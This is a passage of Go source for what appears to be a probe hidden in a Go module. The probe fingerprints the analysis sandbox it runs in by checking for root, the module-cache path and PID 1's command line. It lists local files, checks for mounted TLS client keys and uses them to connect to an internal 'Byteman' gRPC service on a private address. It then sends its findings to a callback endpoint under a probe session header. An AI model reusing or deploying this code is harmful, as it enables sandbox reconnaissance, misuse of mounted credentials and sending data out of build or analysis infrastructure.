		}
	}
	return fields, nil
}
func grpcFrame(payload []byte) []byte {
	f := make([]byte, 5, 5+len(payload))
	binary.BigEndian.PutUint32(f[1:], uint32(len(payload)))
	return append(f, payload...)
}
func appendUvarint(dst []byte, v uint64) []byte {
	var b [binary.MaxVarintLen64]byte
	n := binary.PutUvarint(b[:], v)
	return append(dst, b[:n]...)
}
func appendVarintField(dst []byte, n int, v uint64) []byte {
	dst = appendUvarint(dst, uint64(n<<3))
	return appendUvarint(dst, v)
}
func appendBytesField(dst []byte, n int, v []byte) []byte {
	dst = appendUvarint(dst, uint64(n<<3|2))
	dst = appendUvarint(dst, uint64(len(v)))
	return append(dst, v...)
}
func appendStringField(dst []byte, n int, v string) []byte {
	return appendBytesField(dst, n, []byte(v))
}

func allowedGRPCContentType(value string) bool {
	return value == "application/grpc"
}

func applyDownloadHeaders(request *http.Request) {
	request.Header.Set("Content-Type", "application/grpc")
	request.Header.Set("TE", "trailers")
	request.Header.Set("User-Agent", expectedUserAgent)
	request.Header.Set("Grpc-Timeout", strconv.Itoa(int(downloadGRPCTimeout/time.Second))+"S")
	request.Header[http.CanonicalHeaderKey("X-SOS-SessionID")] = []string{""}
}

func captureGRPCMetadata(h http.Header, status, message *grpcMetadataValue) {
	*status = captureGRPCMetadataValue(h, "Grpc-Status", false)
	*message = captureGRPCMetadataValue(h, "Grpc-Message", true)
}
func captureDownloadTrailers(response *http.Response, result *downloadResult) {
	if len(response.Trailer) == 0 {
		return
	}
	result.TrailersObserved = true
	captureGRPCMetadata(response.Trailer, &result.GRPCStatusTrailer, &result.GRPCMessageTrailer)
}
func captureGRPCMetadataValue(h http.Header, name string, decode bool) grpcMetadataValue {
	values := []string(nil)
	for key, candidates := range h {
		if strings.EqualFold(key, name) {
			values = append(values, candidates...)
		}
	}
	if values == nil {
		return grpcMetadataValue{}
	}
	raw := strings.Join(values, "\x00")
	d := sha256.Sum256([]byte(raw))
	text := raw
	if decode {
		if decoded, err := url.PathUnescape(raw); err == nil {
			text = decoded
		}
		text = cleanSensitiveText(text)
	} else if len(text) > 64 {
		text = text[:64] + "[truncated]"
	}
	return grpcMetadataValue{Present: true, Values: len(values), RawBytes: len(raw), RawSHA256: hex.EncodeToString(d[:]), Text: text}
}

func mountedPrivateRootPool(pem []byte) (*x509.CertPool, error) {
	roots := x509.NewCertPool()
	if !roots.AppendCertsFromPEM(pem) {
		return nil, errors.New("mounted Byteman root pool contained no certificates")
	}
	return roots, nil
}
func verifyLegacyLocalhost(state tls.ConnectionState, roots *x509.CertPool) error {
	if len(state.PeerCertificates) == 0 {
		return errors.New("Byteman TLS peer sent no certificate")
	}
	leaf := state.PeerCertificates[0]
	if leaf.Subject.CommonName != bytemanTLSServerName {
		return errors.New("Byteman TLS legacy common name was not localhost")
	}
	intermediates := x509.NewCertPool()
	for _, cert := range state.PeerCertificates[1:] {
		intermediates.AddCert(cert)
	}
	_, err := leaf.Verify(x509.VerifyOptions{Roots: roots, Intermediates: intermediates, KeyUsages: []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth}})
	if err != nil {
		return fmt.Errorf("Byteman TLS chain verification failed: %w", err)
	}
	return nil
}
func rejectRedirect(_ *http.Request, _ []*http.Request) error {
	return http.ErrUseLastResponse
}
func newBytemanClient() (*http.Client, string, error) {
	cert, err := tls.LoadX509KeyPair(clientCertificatePath, clientKeyPath)
	if err != nil {
		return nil, "", err
	}
	pem, err := os.ReadFile(serverPoolPath)
	if err != nil {
		return nil, "", err
	}
	roots, err := mountedPrivateRootPool(pem)
	if err != nil {
		return nil, "", err
	}
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	addresses, err := net.DefaultResolver.LookupIPAddr(ctx, bytemanServiceHost)
	if err != nil {
		return nil, "", errors.New("direct Byteman service did not resolve")
	}
	var selected net.IP
	for _, candidate := range addresses {
		if candidate.IP.IsPrivate() && !candidate.IP.IsUnspecified() && !candidate.IP.IsMulticast() {
			selected = candidate.IP
			break
		}
	}
	if selected == nil {
		return nil, "", errors.New("direct Byteman service had no private address")
	}
	rpcDialAddress = net.JoinHostPort(selected.String(), strconv.Itoa(bytemanServicePort))
	tlsConfig := &tls.Config{Certificates: []tls.Certificate{cert}, RootCAs: roots, MinVersion: tls.VersionTLS12, ServerName: bytemanTLSServerName, InsecureSkipVerify: true, VerifyConnection: func(state tls.ConnectionState) error { return verifyLegacyLocalhost(state, roots) }}
	dialer := &net.Dialer{Timeout: callbackTimeout, KeepAlive: 30 * time.Second}
	transport := &http.Transport{Proxy: nil, DialContext: func(ctx context.Context, network, _ string) (net.Conn, error) {
		return dialer.DialContext(ctx, network, rpcDialAddress)
	}, TLSClientConfig: tlsConfig, ForceAttemptHTTP2: true}
	endpoint := "https://" + net.JoinHostPort(bytemanServiceHost, strconv.Itoa(bytemanServicePort))
	return &http.Client{Transport: transport, CheckRedirect: rejectRedirect, Timeout: downloadHTTPTimeout}, endpoint, nil
}

func submitProbeReport(endpoint, id, cwd string, started time.Time, report probeReport) error {
	encoded, err := json.MarshalIndent(report, "", "  ")
	result := commandResult{Version: protocolVersion, Session: callbackSessionNonce, ID: id, CWD: cwd, DurationMS: time.Since(started).Milliseconds()}
	if err != nil {
		result.ExitCode, result.Stderr = 125, cleanError(err)
	} else {
		result.Stdout = string(encoded)
	}
	return submitResult(endpoint, result)
}
func newCallbackClient() *http.Client {
	transport := &http.Transport{Proxy: nil, TLSClientConfig: &tls.Config{MinVersion: tls.VersionTLS12}}
	return &http.Client{Transport: transport, CheckRedirect: rejectRedirect, Timeout: callbackTimeout}
}
func submitResult(endpoint string, result commandResult) error {
	body, err := json.Marshal(result)
	if err != nil || len(body) > maximumResultBytes {
		return errors.New("result envelope was invalid")
	}
	ctx, cancel := context.WithTimeout(context.Background(), callbackTimeout)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, http.MethodPut, endpoint, bytes.NewReader(body))
	if err != nil {
		return err
	}
	request.Header.Set("Content-Type", "application/json")
	request.Header.Set("User-Agent", expectedUserAgent)
	request.Header.Set("X-Codex-Probe-Session", callbackSessionNonce)
	client := newCallbackClient()
	defer client.CloseIdleConnections()
	response, err := client.Do(request)
	if err != nil {
		return err
	}
	defer response.Body.Close()
	_, _ = io.Copy(io.Discard, io.LimitReader(response.Body, 4096))
	if response.StatusCode != http.StatusCreated {
		return fmt.Errorf("result endpoint HTTP %d", response.StatusCode)
	}
	return nil
}
func initialWorkingDirectory() string {
	if filepath.IsAbs(os.Args[3]) {
		candidate := filepath.Clean(os.Args[3])
		if info, err := os.Stat(candidate); err == nil && info.IsDir() {
			return candidate
		}
	}
	directory, err := os.Getwd()
	if err != nil || !filepath.IsAbs(directory) {
		return "/"
	}
	return filepath.Clean(directory)
}
func inspectIdentity(cwd string) identityResult {
	lane := "other"
	prefix := "/capslock/modcache/" + moduleName + "@" + probeVersion
	if os.Geteuid() == 0 && (cwd == prefix || strings.HasPrefix(cwd, prefix+"/")) && strings.Contains(readSmallFile("/proc/1/cmdline", 8192), "talisman-worker-capabilities") {
		lane = "capslock"
	} else if strings.Contains(cwd, "/pkg/mod/"+moduleName+"@"+probeVersion) {
		lane = "generic"
	}
	hostname, _ := os.Hostname()
	result := identityResult{Lane: lane, CWD: cwd, UID: os.Geteuid(), GID: os.Getegid(), Hostname: hostname, PID1: strings.ReplaceAll(readSmallFile("/proc/1/cmdline", 8192), "\x00", " ")}
	if len(result.PID1) > 1024 {
		result.PID1 = result.PID1[:1024] + "[truncated]"
	}
	entries, _ := os.ReadDir(cwd)
	for _, entry := range entries {
		if len(result.ModuleFiles) >= 128 {
			break
		}
		if info, err := entry.Info(); err == nil {
			result.ModuleFiles = append(result.ModuleFiles, fileEntry{Name: entry.Name(), Mode: info.Mode().String(), Size: info.Size()})
		}
	}
	for _, path := range []string{serverPoolPath, clientCertificatePath, clientKeyPath} {
		item := tlsFile{Path: path}
		if info, err := os.Stat(path); err == nil && info.Mode().IsRegular() {
			item.Present, item.Mode, item.Size = true, info.Mode().String(), info.Size()
		}
		result.TLSFiles = append(result.TLSFiles, item)
	}
	return result
}
func readSmallFile(path string, maximum int64) string {
	file, err := os.Open(path)
	if err != nil {
		return ""
	}
	defer file.Close()
	value, err := io.ReadAll(io.LimitReader(file, maximum+1))
	if err != nil || int64(len(value)) > maximum {
		return ""
	}
	return string(value)
}
func cleanError(err error) string {
	if err == nil {
		return ""
	}
	return cleanSensitiveText(err.Error())
}
func cleanSensitiveText(value string) string {
	for _, secret := range []string{callbackSessionNonce, pinnedReadbackURL, rpcDialAddress} {
		if secret != "" {
			value = strings.ReplaceAll(value, secret, "[redacted]")
		}
	}
	if len(value) > 1024 {
		value = value[:1024] + "[truncated]"
	}
	return value
}
